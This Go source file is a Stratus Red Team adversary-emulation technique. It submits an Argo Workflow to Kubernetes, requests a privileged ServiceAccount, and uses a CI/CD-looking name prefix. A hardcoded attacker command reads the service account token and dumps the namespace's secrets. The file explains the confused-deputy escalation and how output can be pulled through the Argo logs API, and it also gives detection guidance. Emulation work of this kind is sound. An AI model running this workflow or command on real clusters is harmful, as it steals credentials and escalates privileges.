package kubernetes

import (
	"context"
	_ "embed"
	"fmt"

	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/log"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
)

//go:embed main.tf
var tf []byte

// GroupVersionResource of the Argo Workflows Workflow custom resource
var workflowGVR = schema.GroupVersionResource{
	Group:    "argoproj.io",
	Version:  "v1alpha1",
	Resource: "workflows",
}

// The label used to identify workflows created by Stratus Red Team, so that
// revert can find and delete workflows whose name was server-generated via
// generateName.
const stratusLabel = "datadoghq.com/stratus-red-team"

// generateNamePrefix mimics the naming conventions of legitimate CI/CD pipeline
// workflows (masquerading, ATT&CK T1036).
const generateNamePrefix = "build-deploy-"

// attackerCommand is the arbitrary command the workflow would execute on a
// cluster where an Argo controller is running.
const attackerCommand = "cat /var/run/secrets/kubernetes.io/serviceaccount/token && kubectl get secrets -n $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace) -o json"

// privilegedServiceAccountName is the ServiceAccount the workflow requests to
// run under. On a cluster where an Argo controller is running, the workflow pod
// would run with this identity's permissions.
const privilegedServiceAccountName = "argo-workflow-controller"

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "k8s.privilege-escalation.create-argo-workflow",
		FriendlyName: "Create Malicious Argo Workflow",
		Platform:     stratus.Kubernetes,
		IsIdempotent: false, // workflows use server-side generateName; each detonation creates a new workflow
		MitreAttackTactics: []mitreattack.Tactic{
			mitreattack.PrivilegeEscalation,
			mitreattack.Execution,
		},
		Description: `
Submits a malicious <code>Workflow</code> to the Argo Workflows API that executes arbitrary commands under a privileged ServiceAccount.

Argo's controller acts as a confused deputy: it reads the workflow spec as a trusted instruction and creates the workflow pods using its own, typically highly-privileged, Kubernetes credentials. An attacker who only holds the Argo-level permission <code>create workflows</code> (commonly granted to CI/CD service accounts) can therefore have arbitrary workloads run with the permissions of any ServiceAccount in the namespace — their own Kubernetes RBAC is irrelevant. The workflow output (e.g. dumped secrets) can be exfiltrated through the Argo API logs endpoint without any Kubernetes RBAC. The <code>generateName</code> prefix mimics legitimate CI/CD naming conventions (masquerading).

This technique is designed for local simulation.

Warm-up:

- Create a namespace.
- Install a minimal Argo Workflows <code>Workflow</code> CustomResourceDefinition, so the technique can be simulated on a cluster that does not have Argo Workflows installed.

Detonation:

- Create an <code>argoproj.io/v1alpha1</code> <code>Workflow</code> with a <code>generateName</code> prefix mimicking CI/CD pipelines, whose container runs an attacker command and requests a privileged <code>serviceAccountName</code>.

Note: because no Argo controller is running in the local-simulation setup, the Workflow is never reconciled and no pod is actually created. The emulated signal is the creation of the malicious Workflow object itself. Against a cluster that already runs Argo Workflows, the controller would schedule the pod with the requested ServiceAccount.

References:

- https://kubernetes-security.cloud/topics/weaponizing-argo-workflows
- https://argo-workflows.readthedocs.io/en/stable/security/
- https://argo-workflows.readthedocs.io/en/stable/workflow-restrictions/
`,
		Detection: `
Monitor the Kubernetes audit logs for <code>create</code> operations on <code>workflows.argoproj.io</code> objects.

Alert in particular on Argo Workflows that:
<ul>
<li>specify a <code>serviceAccountName</code> more privileged than the submitter's own identity (privilege escalation via the controller's confused-deputy behavior);</li>
<li>use a <code>generateName</code> prefix that mimics legitimate CI/CD pipeline naming conventions (masquerading);</li>
<li>run container images or commands outside of your approved allowlist, especially commands reading service account tokens or listing secrets.</li>
</ul>

Also alert on API access patterns: workflows created by identities that do not normally submit workflows, and workflow log reads (<code>GET /api/v1/workflows/&lt;ns&gt;/&lt;name&gt;/log</code>) by non-CI/CD identities.

Where possible, restrict <code>workflows create</code> permissions to dedicated CI/CD service accounts, and enable Argo Workflows <code>workflowRestrictions</code> to limit allowed container images, ServiceAccounts, and volume types.
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

// buildWorkflow returns the unstructured malicious Argo Workflow object
func buildWorkflow(namespace string) *unstructured.Unstructured {
	return &unstructured.Unstructured{
		Object: map[string]interface{}{
			"apiVersion": "argoproj.io/v1alpha1",
			"kind":       "Workflow",
			"metadata": map[string]interface{}{
				"generateName": generateNamePrefix,
				"namespace":    namespace,
				"labels": map[string]interface{}{
					stratusLabel: "true",
				},
			},
			"spec": map[string]interface{}{
				"entrypoint":         "main",
				"serviceAccountName": privilegedServiceAccountName,
				"templates": []interface{}{
					map[string]interface{}{
						"name": "main",
						"container": map[string]interface{}{
							"image":   "alpine:latest",
							"command": []interface{}{"sh", "-c"},
							"args":    []interface{}{attackerCommand},
						},
					},
				},
			},
		},
	}
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	namespace := params["namespace"]

	client, err := dynamic.NewForConfig(providers.K8s().GetRestConfig())
	if err != nil {
		return fmt.Errorf("unable to build Kubernetes dynamic client: %w", err)
	}

	log.Println("Submitting malicious Argo Workflow in namespace " + namespace)
	created, err := client.Resource(workflowGVR).Namespace(namespace).Create(
		context.Background(), buildWorkflow(namespace), metav1.CreateOptions{},
	)
	if err != nil {
		return fmt.Errorf("unable to create Argo Workflow: %w", err)
	}

	log.Println("Successfully submitted Argo Workflow " + created.GetName() + " running under ServiceAccount " + privilegedServiceAccountName)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	namespace := params["namespace"]

	client, err := dynamic.NewForConfig(providers.K8s().GetRestConfig())
	if err != nil {
		return fmt.Errorf("unable to build Kubernetes dynamic client: %w", err)
	}

	// The workflow name is server-generated via generateName, so find Stratus
	// Red Team workflows by label instead of by name.
	log.Println("Deleting Stratus Red Team Argo Workflows in namespace " + namespace)
	err = client.Resource(workflowGVR).Namespace(namespace).DeleteCollection(
		context.Background(), metav1.DeleteOptions{}, metav1.ListOptions{
			LabelSelector: stratusLabel + "=true",
		},
	)
	if err != nil {
		return fmt.Errorf("unable to delete Argo Workflows: %w", err)
	}

	return nil
}
